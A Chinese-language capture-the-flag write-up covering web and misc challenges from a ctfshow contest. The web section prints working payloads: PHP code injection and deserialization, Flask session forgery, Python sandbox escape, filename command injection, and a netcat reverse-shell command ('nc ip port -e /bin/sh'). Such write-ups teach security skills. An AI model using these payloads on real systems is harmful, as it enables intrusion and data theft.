[TOC]



## web

### web签到            

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
```

仔细观察题目，这题就是套娃，

首先我们需要传个cookie，名为 `CTFshow-QQ群:` 但是一直不起作用，

我们需要将它进行url编码，此处值为：`a`

`$_POST[a]=b` -> `$_GET[b]=c` ->

 `$_REQUEST[c][6][0][7][5][8][0][9][4][4]=system('ls');`

注意：c应该传一个数组



### web2 c0me_t0_s1gn

源码有前一半flag，控制台有另一半





### 我的眼里只有$            

```php
<?php

error_reporting(0);
extract($_POST);
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
highlight_file(__FILE__);
```

这是一个php变量覆盖题，要弄好多层，自己敲很麻烦，我们应该写个python脚本

总共36个$。这里有一个`extract()` 函数：

![image-20230306112022365](https://s2.loli.net/2023/03/06/QxBaVptL1gET95M.png)

这个函数可以将此处`$_POST` 数组中的键名赋值为变量，我们只需要在post中传参即可

```python
import string

code = "assert($_GET[1]);"
s = string.ascii_letters  # 获取所有大小写英文字母

post = "_=a&"

for i in range(34):
    post += s[i] + "=" + s[i+1] + "&"

post += s[i+1] + "=" + code
print(post)

```

输出：

```
_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=assert($_GET[1]);
```

我们只需要使用get传参，命令执行即可



### 抽老婆            

打开页面发现一个下载的按钮，点击后可以下载图片

![image-20230306113940399](https://s2.loli.net/2023/03/06/tx3zROkN5Fgfb6l.png)

`url:`

```
http://3cef0567-fe4d-413d-911e-ebf363d7fda8.challenge.ctf.show/download?file=0df74e7fc6614180ee892683f13d5abf.jpg
```

这里好像存在任意文件下载漏洞，我们随便输入一个路径：

![image-20230306113847191](https://s2.loli.net/2023/03/06/nXkE91vTNVF63cY.png)

我们发现这个是 python的 flask框架，于是我们想要去读取 /app/app.py文件，

使用相对路径成功读取

![image-20230306114101898](https://s2.loli.net/2023/03/06/kWGmnPQgMocsF41.png)

```python
# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File       : app.py
# Time       ：2022/11/07 09:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：抽老婆，哇偶~
"""

from flask import *
import os
import random
from flag import flag

#初始化全局变量
app = Flask(__name__)
app.config['SECRET_KEY'] = 'tanji_is_A_boy_Yooooooooooooooooooooo!'

@app.route('/', methods=['GET'])
def index():  
    return render_template('index.html')


@app.route('/getwifi', methods=['GET'])
def getwifi():
    session['isadmin']=False
    wifi=random.choice(os.listdir('static/img'))
    session['current_wifi']=wifi
    return render_template('getwifi.html',wifi=wifi)



@app.route('/download', methods=['GET'])
def source(): 
    filename=request.args.get('file')
    if 'flag' in filename:
        return jsonify({"msg":"你想干什么？"})
    else:
        return send_file('static/img/'+filename,as_attachment=True)


@app.route('/secret_path_U_never_know',methods=['GET'])
def getflag():
    if session['isadmin']:
        return jsonify({"msg":flag})
    else:
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})



if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=True)

```

分析一下，这题考点就是 `flask session伪造` ，只需要把 `session['isadmin']` 改为true即可。

但是session伪造需要key，这里也给出了：`tanji_is_A_boy_Yooooooooooooooooooooo!`

于是我们可以使用脚本伪造cookie：

![image-20230306114542730](https://s2.loli.net/2023/03/06/kvBz9sfjlCmMFVG.png)

我们将 `isadmin`改为True，然后再加密：

![image-20230306114941255](https://s2.loli.net/2023/03/06/DzpGkZeBmnbAtaM.png)

该一下session访问路径得到flag





### 一言既出

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
    if ($_GET['num'] == 114514){
        assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
        echo $flag;
    } 
}
```

很简单，payload：

```
?num=114514-114514+1919810  //注意+需要url编码为：%2B,否则会被解析为空格
```

这里考察php弱比较，以及 intval()函数

官方wp，由于这里使用 assert()函数，可以将字符串当作代码执行，所以我们可以去闭合括号：

```
?num=);%23               使用#注释掉后面
```





### 驷马难追

```php
 <?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
} 
```

使用运算符绕过即可





### TapTapTap            

一个js小游戏题，直接找js源码：

![image-20230306125703411](https://s2.loli.net/2023/03/06/mwB2A1gLIqiYJrM.png)

找到一串可疑代码，我们在控制台执行：

![image-20230306125637870](https://s2.loli.net/2023/03/06/cFdXVQj8wKTAszY.png)

该路径存在flag



### Webshell            

```php
 <?php 
    error_reporting(0);

    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }

?> 
```

一个简单的php反序列化

直接构造：

```php
<?php
class Webshell {
    public $cmd = "cat f*";
}
echo urlencode(serialize(new Webshell()));

输出：
O%3A8%3A%22Webshell%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A6%3A%22cat+f%2A%22%3B%7D
```



### 化零为整            

```php
<?php

highlight_file(__FILE__);
include "flag.php";

$result='';

for ($i=1;$i<=count($_GET);$i++){
    if (strlen($_GET[$i])>1){
        die("你太长了！！");
        }
    else{
    $result=$result.$_GET[$i];
    }
}

if ($result ==="大牛"){
    echo $flag;
}
```

这题的意思是我们get传参数据长度为1，并且拼接后得到 `大牛`

如何实现呢？我之前想到的是unicode编码之类的，但是此处可以使用url编码：

```php
<?php
echo urlencode("大牛");

输出：
%E5%A4%A7%E7%89%9B
```

然后get传参：

```
?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B
```





### 无一幸免            

```php
<?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['0'])){
    $arr[$_GET['0']]=1;
    if ($arr[]=1){
        die($flag);
    }
    else{
        die("nonono!");
    }
}
```

这题有bug，直接给0传参就行



### 无一幸免_FIXED            

```php
<?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['0'])){
    $arr[$_GET['0']]=1;
    if ($arr[]=1){
        die("nonono!");
    }
    else{
        die($flag);
    }
}
?>
```

这一题难点在于绕过 `$arr[]=1` 这一个恒真条件，这条语句的意思是：在数组后面添加一个元素1

64位有符号数，能表示最大数为： `2^63-1 = 9223372036854775807`

我们只需传入：

```
?0=9223372036854775807
```

即可，这样数组的下一个元素下表越界了，则条件 `$arr[]=1` 为假





### 传说之下（雾）

观察源码，找js代码

![image-20230306161257156](https://s2.loli.net/2023/03/06/b5xmY12SVQvIhfC.png)

发现创建了一个 Game对象，里面记录的 分数 score

观察游戏：

![image-20230306161510984](https://s2.loli.net/2023/03/06/jcJHr8dN7UzROoZ.png)

只要得到2077分就可以拿flag，

于是我们在控制台输入： `Game.score=2077`

然后玩游戏吃一个果子就行





### 算力超群

我们对计算进行抓包

![image-20230306162704519](https://s2.loli.net/2023/03/06/pMQZPRVnLahUs7z.png)

发现该题使用 `python flask框架`  并且该处可能可以使用命令执行，

我们可以使用 `os.system()` 进行命令执行，但是 os 模块需要进行导入，我们没有导入，怎么办呢

我们可以使用 `__import__()` 函数 进行动态导入模块

> **__import__()** 函数用于动态加载类和函数 。
>
> 如果一个模块经常变化就可以使用 __import__() 来动态载入。

我们可以使用： 

```python
__import__('os').system('')
```

进行命令执行

此处我们测试到 `number2` 位置可以插入代码

我们可以使用 `nc 命令`去`反弹shell`

```python
__import__('os').system('nc ip port -e /bin/sh')
```

然后在服务器指定端口进行监听：

```python
nc -lvp 9996
```

![image-20230306164640732](https://s2.loli.net/2023/03/06/rliko2HDWI3Rnzg.png)

我们可以直接在服务器执行命令，查看flag

如图成功得到flag







### 算力升级            

```python
    # !/usr/bin/env python
    # -*-coding:utf-8 -*-
    """
    # File       : app.py
    # Time       ：2022/10/20 15:16
    # Author     ：g4_simon
    # version    ：python 3.9.7
    # Description：算力升级--这其实是一个pyjail题目
    """
    from flask import *
    import os
    import re,gmpy2 
    import json
    #初始化全局变量
    app = Flask(__name__)
    pattern=re.compile(r'\w+')
    @app.route('/', methods=['GET'])
    def index():  
        return render_template('index.html')
    @app.route('/tiesuanzi', methods=['POST'])
    def tiesuanzi():
        code=request.form.get('code')
        for item in pattern.findall(code):#从code里把单词拿出来
            if not re.match(r'\d+$',item):#如果不是数字
                if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
                   return jsonify({"result":1,"msg":f"你想干什么？{item}不是有效的函数"})
        try:
            result=eval(code)
            return jsonify({"result":0,"msg":f"计算成功，答案是{result}"})
        except:
            return jsonify({"result":1,"msg":f"没有执行成功，请检查你的输入。"})
    @app.route('/source', methods=['GET'])
    def source():  
        return render_template('source.html')
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=80,debug=False)
```

这题好像是关于沙箱逃逸，我们先看一篇文章：[[PyJail] python沙箱逃逸探究](https://zhuanlan.zhihu.com/p/578966149)

我们仔细分析这一段代码：

```python
	pattern=re.compile(r'\w+')	
    code=request.form.get('code')
        for item in pattern.findall(code):#从code里把单词拿出来
            if not re.match(r'\d+$',item):#如果不是数字
                if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
                   return jsonify({"result":1,"msg":f"你想干什么？{item}不是有效的函数"})
        try:
            result=eval(code)
            return jsonify({"result":0,"msg":f"计算成功，答案是{result}"})
```

这一段代码判断，首先把所有的字母、数字、下划线_ 拿出来(findall)：单词，

如果单词不在gmpy2库中，则执行不了eval()，所以我们必须使用gmpy2库中的函数名来构造想要的代码。

`dir()`函数可以返回参数的属性以及函数列表。

例如，我们返回`gmpy2` 的列表：dir(gmpy2)

![image-20230307114741408](https://s2.loli.net/2023/03/07/mtdIae4KDzH6jCA.png)

根据分析，特殊字符可以随便使用，

我们需要使用图片中的函数名来构造payload。

观察可知，里面有：`gmpy2`  、`__builtins__` 等

> **`__builtins__`**：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如`str`、`chr`、`ord`、`dict`、`dir`等。

我们使用 `gmpy2.__builtins__` 查看其中存在的属性、函数，返回的是字典：

![image-20230307115516500](https://s2.loli.net/2023/03/07/b5GxBKqA2JORX9i.png)

其中包含 eval() 函数，我们需要通过`gmpy2`中有的函数来构造 eval

经过观察，gmpy2中存在：`invert`、`fac`、`lcm` 等函数，我们可以通过对字符串中字符取值，拼接为eval

```python
gmpy2.__builtins__['invert'[3]+'invert'[2]+'fac'[1]+'lcm'[0]](
```

然后我们需要编写脚本，通过gmpy2函数，构造出eval()函数中的代码：

```python
__import__('os').popen('cat /flag').read()
```

这一句的意思是，导入os模块，使用`os.popen()` 去执行命令，然后读取出来

我们自己写个脚本进行构造：

```python
import gmpy2
s = "__import__('os').popen('cat /flag').read()"

payload = "gmpy2.__builtins__['invert'[3]+'invert'[2]+'fac'[1]+'lcm'[0]]("

for i in s: # 遍历想执行的代码
    if i in " '()/.":  	# 如果是这些字符，就直接相加（注意结尾的加号+） 
        payload += f"\"{i}\"+"
    else: 	# 如果是字母，我们需要使用gmpy2函数进行构造
        temp_str = ""
        temp_index = -1
        for j in dir(gmpy2): # 遍历gmpy2中的函数
            if i in j:		# 如果函数中存在该字母
                temp_index = j.find(i)  # 找到该字母下标
                temp_str = j
        payload += f"\"{temp_str}\"[{temp_index}]+"  
        # payload加上函数中指定下标，如 "invert"[3] 就是字母e,注意末尾加上加号+

payload = payload[:-1] + ")" # 将末尾+替换为空格
print(payload)
```
payload:
```python
gmpy2.__builtins__['invert'[3]+'invert'[2]+'fac'[1]+'lcm'[0]]("xbit_mask"[4]+"xbit_mask"[4]+"xbit_mask"[2]+"xmpz"[1]+"xmpz"[2]+"zero"[3]+"zero"[2]+"zeta"[2]+"xbit_mask"[4]+"xbit_mask"[4]+"("+"'"+"zero"[3]+"xbit_mask"[7]+"'"+")"+"."+"xmpz"[2]+"zero"[3]+"xmpz"[2]+"zeta"[1]+"yn"[1]+"("+"'"+"unpack"[4]+"zeta"[3]+"zeta"[2]+" "+"/"+"root_of_unity"[6]+"rint_floor"[6]+"zeta"[3]+"sign"[2]+"'"+")"+"."+"zero"[2]+"zeta"[1]+"zeta"[3]+"t_mod_2exp"[4]+"("+")")
```





### easyPytHon_P            

```python
源码在此：

from flask import request
cmd: str = request.form.get('cmd')
param: str = request.form.get('param')
# ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓
import subprocess, os
if cmd is not None and param is not None:
    try:
        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
        print('Done!')
    except subprocess.TimeoutExpired:
        print('Timeout!')
    except:
        print('Error!')
else:
    print('No Flag!')
```

这题就是命令执行，但是我们不知道 `subprocess.run()` 是什么东西

其实就是执行命令的一个函数。



> **subprocess.run()**
>
> 第一个args是最重要的，它就是要执行的命令。注意它必须是一个列表，里面的内容包括了命令和命令参数，比如：
>
> ```python
> subprocess.run(["ls", "-l", "/usr/bin"])
> ```
>
> 那么题中就是取cmd中前三个为命令，param为命令参数，`__file__`是当前文件路径（当param中传入的也是文件路径参数时，命令行会根据这两个路径参数分别执行成两条命令，输出两个结果）；第二个cwd为当前工作路径，**os.getcwd()**就是返回进程的当前工作目录，timeout=5,就是超时时间最大设置为5s。







### 遍地飘零

```php
 <?php
include "flag.php";
highlight_file(__FILE__);

$zeros="000000000000000000000000000000";

foreach($_GET as $key => $value){
    $$key=$$value;
}

if ($flag=="000000000000000000000000000000"){
    echo "好多零";
}else{
    echo "没有零，仔细看看输入有什么问题吧";
    var_dump($_GET);
}

没有零，仔细看看输入有什么问题吧array(0) { } 
```

观察题目

我们需要将 `$_GET` 变量值赋值为 `$flag` ，

这样我们通过 var_dump() 就可以将 flag内容输出了

payload:

```
_GET=flag
```







### 茶歇区            

![image-20230306165435312](https://s2.loli.net/2023/03/06/9tS8peOUcWYFubB.png)



这一题是叫我们买东西得到 114514分以上就行，但是我们经过尝试，不能输入负值，然后没有什么思路了。

看了wp，考点是整形溢出

64位的有符号数表示的最大范围是 `2^63-1 = 9223372036854775807`  19位数

但是此时这里进行 `x10` 运算，溢出太多也没有用，所以我们需要传入18位数，这样刚好溢出

例如： `932337203685477580`

传两次得到flag







### 小舔田？



```php
<?php
include "flag.php";
highlight_file(__FILE__);

class Moon{
    public $name="月亮";
    public function __toString(){
        return $this->name;
    }
    
    public function __wakeup(){
        echo "我是".$this->name."快来赏我";
    }
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";

    public function call(){
        global $flag;
        if ($this->nickname=="小甜甜"){
            echo $flag;
        }else{
            echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
            echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
        }
    }
    
    public function __toString(){
        $this->call();
        return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
    }
}

if (isset($_GET['code'])){
    unserialize($_GET['code']);

}else{
    $a=new Ion_Fan_Princess();
    echo $a;
}
```

简单反序列化：

```php
<?php

class Moon{
    public $name;
    public function __construct() {
        $this->name = new Ion_Fan_Princess();
    }
}

class Ion_Fan_Princess{
    public $nickname="小甜甜";
}

echo serialize(new Moon());

payload：
O:4:"Moon":1:{s:4:"name";O:16:"Ion_Fan_Princess":1:{s:8:"nickname";s:9:"小甜甜";}}
```





### LSB探姬            

源码：

```python
    # !/usr/bin/env python
    # -*-coding:utf-8 -*-
    """
    # File       : app.py
    # Time       ：2022/10/20 15:16
    # Author     ：g4_simon
    # version    ：python 3.9.7
    # Description：TSTEG-WEB
    # flag is in /app/flag.py
    """
    from flask import *
    import os
    #初始化全局变量
    app = Flask(__name__)
    @app.route('/', methods=['GET'])
    def index():    
        return render_template('upload.html')
    @app.route('/upload', methods=['GET', 'POST'])
    def upload_file():
        if request.method == 'POST':
            try:
                f = request.files['file']
                f.save('upload/'+f.filename)
                cmd="python3 tsteg.py upload/"+f.filename
                result=os.popen(cmd).read()
                data={"code":0,"cmd":cmd,"result":result,"message":"file uploaded!"}
                return jsonify(data)
            except:
                data={"code":1,"message":"file upload error!"}
                return jsonify(data)
        else:
            return render_template('upload.html')
    @app.route('/source', methods=['GET'])
    def show_source():
        return render_template('source.html')
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=80,debug=False)
```

突破点：

```python
cmd="python3 tsteg.py upload/"+f.filename
result=os.popen(cmd).read()
```

这里可以进行 python 命令执行，只需要改一个文件名即可

```python
filename="1;cat flag.py"
```

我们使用分号 ; 进行命令分隔，然后 cat即可

![image-20230306173101904](https://s2.loli.net/2023/03/06/CYUbksMRc4GNyQi.png)







### Is_Not_Obfuscate            

查看源码

![image-20230306173407767](https://s2.loli.net/2023/03/06/lpxroTZb2cEi6J1.png)



提示我们访问 `robots.txt`文件

![image-20230306173829040](https://s2.loli.net/2023/03/06/gi2JaMZxsrSOUzy.png)

访问 `/lib.php?flag=0` 什么东西都没有，我们将 0 改为 1：

![image-20230306173943135](https://s2.loli.net/2023/03/06/I5WVKj8uXY6JkMO.png)

发现一大堆编码



没有其他思路，我们继续查看首页：

![image-20230306174236577](https://s2.loli.net/2023/03/06/KJZQPw79UNV51IA.png)



我们发现隐藏了一个 执行按钮，我们将value改为test，然后我们再将上述获得的编码放入input中：

![image-20230306174540414](https://s2.loli.net/2023/03/06/CDUlsbvkK93u4wJ.png)



注意：需要将上述编码进行url编码一次，我们获得如下源码：

![image-20230306174745354](https://s2.loli.net/2023/03/06/vxCYWIrzQmAnuTp.png)

我们主要关注这里：

![image-20230306174848932](https://s2.loli.net/2023/03/06/DRQaTgIsFZfeNYl.png)

思路就是：我们将一句话木马push进去，之后使用pull拉取下来，进行命令执行

![image-20230306180009955](https://s2.loli.net/2023/03/06/2PRcnWeOsNKUQ39.png)

![image-20230306180042873](https://s2.loli.net/2023/03/06/jkqsBo6Tie98CRQ.png)

注意：要在命令后加入`youyou` 再进行md5编码：

![image-20230306180125929](https://s2.loli.net/2023/03/06/35bQdE4RTegtkvw.png)





## Misc

### 杂项签到

![image-20230309195047150](https://s2.loli.net/2023/03/09/19Uni4u2VEFMt8l.png)

直接使用010搜，得到flag



### 损坏的压缩包            

![image-20230309195537236](https://s2.loli.net/2023/03/09/n5lA9KJBi2ZXL3s.png)

使用010打开，发现是png文件，于是将后缀改为png得到flag



### 谜之栅栏            

下载得到【找不同】文件夹，包含两张图片，提示我们找不同，

于是我们使用010打开，然后比较两个文件的不同之处

![image-20230309195624457](https://s2.loli.net/2023/03/09/TcJ3lm8GAKns95E.png)

![image-20230309195640959](https://s2.loli.net/2023/03/09/rO6LtpPGu1fMgxK.png)

然后点击差异部分：

![image-20230309195723092](https://s2.loli.net/2023/03/09/rYsdJGaOLb9gF2H.png)

找到了不同的地方，发现存在一定规律，结合题目可知，这是栅栏密码

于是我们解密：
![image-20230309195925281](https://s2.loli.net/2023/03/09/Fs3XbTykePNwAtx.png)



### 你会数数吗

![image-20230309200110554](https://s2.loli.net/2023/03/09/wTkMCgehvf46Bsa.png)

文件中包含大量无规律字符，根据经验可知，这应该是根据频率来排序：

我们可以直接使用010的直方图功能来排序：

![image-20230309200629065](https://s2.loli.net/2023/03/09/VWmZx7QXpurSv89.png)

然后根据百分比降序排列：

![image-20230309200402076](https://s2.loli.net/2023/03/09/WmX8OeT9iaUyjtD.png)





得到flag

或者使用python脚本来统计：

```python
f = open("C://Users/LIKE/Desktop/misc4", "r")
dic = {}
data = f.read()
for i in data:
    if i in dic:
        dic[i] += 1
    else:
        dic[i] = 1

data = sorted(dic.items(), key=lambda x: x[1], reverse=True) # 根据字典的值排序
for i in data:
    print(i[0], end="")
```



### 你会异或吗

> hint：神秘数字:`0x50`

根据题目，我们将png图片与数字 `0x50` 进行异或运算：

![image-20230309202231508](https://s2.loli.net/2023/03/09/yZLP6CBfTQ5DXOo.png)

![image-20230309202249148](https://s2.loli.net/2023/03/09/Rog2mTA3WQqYcrS.png)

异或后得到真正的png图片，打开得到flag



### flag一分为二

![image-20230309202457748](https://s2.loli.net/2023/03/09/HYWfxkvCqLQtVK6.png)

我们将图片拖入010，发现crc不匹配，我们需要修改高度，可以手动修改，也可以借助脚本算出crc

```python
import zlib
import struct

file = 'C://Users/LIKE/Desktop/miku.png'
fr = open(file, 'rb').read()
data = bytearray(fr[12:29])
# crc32key = eval(str(fr[29:33]).replace('\\x','').replace("b'",'0x').replace("'",''))

crc32key = 0x7507b944  # crc值

# data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00')
n = 4095
for w in range(n):
    width = bytearray(struct.pack('>i', w))
    for h in range(n):
        height = bytearray(struct.pack('>i', h))
        for x in range(4):
            data[x + 4] = width[x]
            data[x + 8] = height[x]
            # print(data)
        crc32result = zlib.crc32(data)
        if crc32result == crc32key:
            print(width, height)
            print(data)
            newpic = bytearray(fr)
            for x in range(4):
                newpic[x + 16] = width[x]
                newpic[x + 20] = height[x]
            #           fw = open(file+'.png','wb')
            fw = open(file, 'wb')
            fw.write(newpic)
            fw.close
            print("It's done!")
```

修复得到一半flag：

![image-20230309203206616](https://s2.loli.net/2023/03/09/zsw6UtJ8jpdSAWM.png)                                                                                                                                                                                                                                                                                                                                                                 

还有一半flag，是在图片中，但是看不到，知识点是`盲水印`

我们使用工具`WaterMark` 可以获得另一半

![image-20230309203403778](https://s2.loli.net/2023/03/09/kgVUYOsIJnXxDZH.png)



### 我是谁？？

这题用眼睛看，或者使用大神脚本



### You and me

![image-20230309204023798](https://s2.loli.net/2023/03/09/OdrzkB6IvgCTP3j.png)

下载后得到两张一摸一样的图片，盲猜使用了盲水印

我们可以使用脚本：`BlindWaterMark`

![image-20230309204230822](https://s2.loli.net/2023/03/09/3DvGdZ7WHi9j1y5.png)

然后得到flag：

![image-20230309204304932](https://s2.loli.net/2023/03/09/NCFIBh4lncR69GH.png)



### 黑丝白丝还有什么丝？

> 题目提示：莫丝密码

点进去一个视频，因为提示摩斯密码，所以我们把黑丝当1，白丝当0，转场为分隔

使用莫斯解密





### 我吐了你随意

下载后得到一个【0宽隐写】文件，很明显使用：[0宽解密](https://www.mzy0.com/ctftools/zerowidth1/)

![image-20230309204641030](https://s2.loli.net/2023/03/09/btN1c7TevRUw95G.png)





### 这是个什么文件？

![image-20230309205140753](https://s2.loli.net/2023/03/09/HAE58rPxiVk6zSC.png)

zip伪加密，将位置上的数改为00

![image-20230309205223909](https://s2.loli.net/2023/03/09/uIFjJc1DSNbke2d.png)

打开这个文件，发现了一串乱码，后缀py，可能需要：[python反编译](https://tool.lu/pyc/)

![image-20230309205349044](https://s2.loli.net/2023/03/09/VpSztaJ6UR1Z7dX.png)

反编译之后我们只需要执行代码就行

![image-20230309205437730](https://s2.loli.net/2023/03/09/w7sXq43aMPloFNe.png)



### 抽象画

![image-20230309205543022](https://s2.loli.net/2023/03/09/mdAuMORfESGqv8I.png)

下载后得到一个txt文件，打开发现疑似base编码，但是我们不知道是哪一类，于是我们可以使用一个

工具：`basecrack`

我们先将编码保存到`1.txt`，然后使用如下代码：

```python
python3 basecrack -f 1.txt  # -f代表从文件中读取
```

![image-20230309205949176](https://s2.loli.net/2023/03/09/zed28E6KMnFNfhD.png)

如图，已经成功解了一次，我们继续：

![image-20230309210040545](https://s2.loli.net/2023/03/09/Kjq8wJWryg1ZOvH.png)

最后一次：

![image-20230309210131944](https://s2.loli.net/2023/03/09/EihYcpvWlV7936T.png)

解出来，发现是png图片，我们保存一下，打开：

![image-20230309210236136](https://s2.loli.net/2023/03/09/b7Hizl2fgmF5LKP.png)

不知道一坨什么玩意儿

查询资料得知，这是一种奇葩编程语言，`Piet是用颜色来编写代码`，我们可以使用 `npiet` 解密

![image-20230309210645860](https://s2.loli.net/2023/03/09/fXe52rFjS9y1viO.png)



### 迅疾响应            

![image-20230309210840932](https://s2.loli.net/2023/03/09/7fqoxWy6XUvdeHc.png)

下载 后得到一张二维码，但是扫不了，看了wp后，使用一个网站：https://merricx.github.io/qrazybox/                                                                                                                              

![image-20230309210935661](https://s2.loli.net/2023/03/09/LVFXR8hCA1uBPz2.png)

首先导入一个图片

![image-20230309211020078](https://s2.loli.net/2023/03/09/sqjY7zinBXUAxtK.png)

然后点击 tools，再分离信息

![image-20230309211045091](https://s2.loli.net/2023/03/09/B67gnHe2EWT5Fxw.png)

得到一半flag

![image-20230309211119337](https://s2.loli.net/2023/03/09/7mVLsI6rCOohTUz.png)

还有一半，将选中区域涂白

![image-20230309211357908](https://s2.loli.net/2023/03/09/PkXnVwfyzJbrEDQ.png)

然后再分离信息，得到flag



### 我可没有骗你            

![image-20230309211531561](https://s2.loli.net/2023/03/09/G1on5gIZDSMF4mq.png)

爆破得到压缩包密码(8位)

得到一个文件，使用010打开：

![image-20230309212326682](https://s2.loli.net/2023/03/09/rIxBzHw15PqM8nC.png)

发现是一个 `wav` 文件，我们使用 `SilentEye ` 进行解密：

![image-20230309212554859](https://s2.loli.net/2023/03/09/nISPDZUvaX7Kfjc.png)

我们需要将 `Sound quality`  换为 `high`



### 你被骗了            

![image-20230309212735630](https://s2.loli.net/2023/03/09/m7cX5TfelPuSis4.png)

这里有一个虚假的flag

这里是mp3隐写，我们使用工具 `MP3Stego`

但是解密需要密码，密码就是：`nibeipianle`

![image-20230309213128985](https://s2.loli.net/2023/03/09/7ygYIV9UuAdpWaC.png)

打开txt文件获得flag





### 一闪一闪亮晶晶            

压缩包有两个文件，其中一个是一个码，但不是二维码：

![image-20230309213501345](https://s2.loli.net/2023/03/09/OjZ8S7tEvIqY5oz.png)

这个是：`汉信码`

我们扫一下：

![image-20230309213618786](https://s2.loli.net/2023/03/09/M8fxJKlVNgmDsRU.png)

得到压缩包密码：`CDBHSBHSxskv6`

解压 m4a 文件，听一下像外星录音，于是我们需要使用 `RXSSTV` 进行识别，需要安装虚拟声卡

听一下就得到flag

![image-20230309214208678](https://s2.loli.net/2023/03/09/dPOiCJVmnUsHkup.png)





### 打不开的图片



联想到png文件开头应该是89 50 4E 47，观察下题目给的png的开头是77 B0 B2 B9，会发现0x89+0x77=0x100, 0x50+0xB0=0x100, 0x4E+0xB2=0x100, 0x47+0xB9=0x100, 所以，只要用0x100减去现在png文件中的每个字节的16进制数即可恢复出可以预览的png图片。
但是要注意这里还有一个小坑，就是0x100是十进制数的256，而bytes格式最大只能表示到255，出现256会报错，所以题目原png文件中是0的位置，还是0，不能用0x100去减。
具体可以写Python脚本来做，而且做这道题的过程中，解决了上次做异或题目（也是菜狗杯的Misc题目之前写了博客）遇到的问题，其实就是把整个文件处理后的结果（int类型）放在list中，再把整个list放在bytes()中即可转换成bytes格式写入新的文件中，得到恢复的文件。

```python
ff=open('./misc5.5.png','rb')
data=ff.read()
l=[]
for dd in data:
    if dd==0:
        l.append(dd)
    else:
        l.append(0x100-dd) 
ff=open('./1234.png','wb') #会新建一个可写入的新文件1234.png
ff.write(bytes(l))
ff.close()
```

















